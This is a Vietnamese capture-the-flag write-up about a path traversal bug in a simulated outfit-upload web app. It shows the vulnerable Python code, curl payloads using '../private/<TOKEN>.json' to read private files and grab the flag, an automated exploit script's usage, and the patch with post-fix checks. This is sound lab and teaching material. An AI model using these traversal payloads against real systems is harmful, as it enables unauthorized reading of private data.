# 03 · Path Traversal — Studio phối đồ (upload manifest)

| | |
|---|---|
| **Khu vực** | Studio phối đồ · `POST /outfits/new` (manifest JSON) |
| **Cần đăng nhập** | Có |
| **Flag nằm ở** | `simulation/private/<token>.json` (trường `stylist_note`) |
| **Script** | [`exploits/upload.py`](exploits/upload.py) |

## 1. Nhận dạng (black-box)

- "Studio phối đồ" nhận một tệp **manifest JSON**; trong đó trường `preview_file` trỏ tới một
  tệp xem trước, và server **in nội dung tệp đó** trong khối `<pre>` của trang kết quả.
- Thử `preview_file` chứa `../`: nội dung trả về đổi theo đường dẫn ⇒ server resolve đường dẫn
  do người dùng kiểm soát và đọc tệp tương ứng → **path traversal / local file read**.

## 2. Phân tích mã nguồn

[`sandbox/app/app.py`](../sandbox/app/app.py) · hàm `outfit_new` (≈ dòng 412–457):

```python
base = (data / "simulation" / "designs").resolve()
sandbox_root = (data / "simulation").resolve()
target = (base / manifest.get("preview_file", "")).resolve()
if patched("upload") and not target.is_relative_to(base):      # <-- chỉ chặn khi đã vá
    abort(400)
# Rào chắn CỨNG (kể cả chưa vá): không bao giờ ra ngoài vùng simulation
if not target.is_relative_to(sandbox_root) or not target.is_file():
    abort(400)
...
return page("Bản phối đã lưu", preview_text=target.read_text(encoding="utf-8"), ...)
```

- Chưa vá: `preview_file` **không** bị ép nằm trong `designs/`, nên `../` cho phép thoát sang
  các thư mục khác **trong cùng `simulation/`**, gồm `simulation/private/` — nơi lưu
  `stylist_note` (flag).
- `preview_text=target.read_text()` được in trong `<pre>`
  ([`templates/shop.html`](../sandbox/app/templates/shop.html) dòng 141).

### ⚠️ Giới hạn quan trọng (đọc kỹ trước khi khai thác)

1. **Rào chắn cứng:** mọi đường dẫn đều phải nằm dưới `.../simulation`. Payload ra ngoài
   (vd `../../../../etc/passwd`) **luôn bị 400, kể cả khi chưa vá**. Đây chỉ là LFI trong vùng
   dữ liệu giả lập, **không chạm hệ thống host**.
2. **Cần biết token nạn nhân:** flag nằm ở `simulation/private/<token>.json` với
   `token = secrets.token_hex(16)` (32 hex, ngẫu nhiên). App **không** liệt kê thư mục private
   và **không** lộ token của bộ phối người khác ở bất kỳ đâu (chỉ chủ bộ phối thấy link
   `/outfits/<token>` sau khi tự upload). Do đó **không thể dò/đoán token nạn nhân** chỉ bằng
   primitive này. Trong thực tế, thử thách Upload **chủ yếu tính điểm phòng thủ/SLA** và việc
   **chứng minh được primitive đọc tệp**; muốn cướp flag Upload giữa các đội thì cần một đường
   rò rỉ token (không có sẵn trong app).

## 3. Khai thác thủ công

**(a) Chứng minh primitive** — đọc tệp preview công khai hợp lệ:

```bash
printf '{"name":"x","preview_file":"lookbook.txt"}' > m.json
curl -s -b jar.txt -F "manifest=@m.json;type=application/json" \
  "http://10.90.0.12/outfits/new" | sed -n 's:.*<pre>\(.*\)</pre>.*:\1:p'
```

**(b) Đọc một tệp private khi đã biết token** `<TOKEN>` (vd. token của chính bạn để PoC, hoặc
token nạn nhân nếu rò rỉ được từ nơi khác):

```bash
printf '{"name":"x","preview_file":"../private/<TOKEN>.json"}' > m.json
curl -s -b jar.txt -F "manifest=@m.json;type=application/json" \
  "http://10.90.0.12/outfits/new" | grep -oE 'MekoDataCTF\{[A-Z0-9]{30}\}'
```

## 4. Script tự động

[`exploits/upload.py`](exploits/upload.py):
1. chứng minh primitive (đọc `lookbook.txt`);
2. **self-PoC**: tự cắm một `stylist_note`, lấy token của mình, rồi đọc lại qua
   `../private/<token>.json` để chứng minh đọc được vùng private;
3. nếu truyền token nạn nhân (tham số thứ 2), đọc flag từ đó.

```bash
python upload.py http://10.90.0.12                         # primitive + self-PoC
python upload.py http://10.90.0.12 <token_nan_nhan_32hex>  # đọc flag khi có token
```

## 5. Bản vá

Bật khóa `upload`:

```json
{"upload": true}
```

Khi vá, server bắt buộc `target.is_relative_to(base)` với `base = simulation/designs` ⇒ mọi
`preview_file` thoát khỏi `designs/` đều bị **400**. (Chi tiết: [PATCHES.md](PATCHES.md).)

**Tự kiểm chứng sau vá:**
- Upload manifest hợp lệ với `preview_file: "lookbook.txt"` vẫn 200 và hiện preview (chức năng còn nguyên).
- `preview_file: "../private/<token>.json"` ⇒ **400** (traversal bị chặn).
- Checker Upload vẫn UP (nó dùng `preview_file=lookbook.txt` hợp lệ và đọc lại ghi chú của chính chủ qua `/outfits/<token>`).
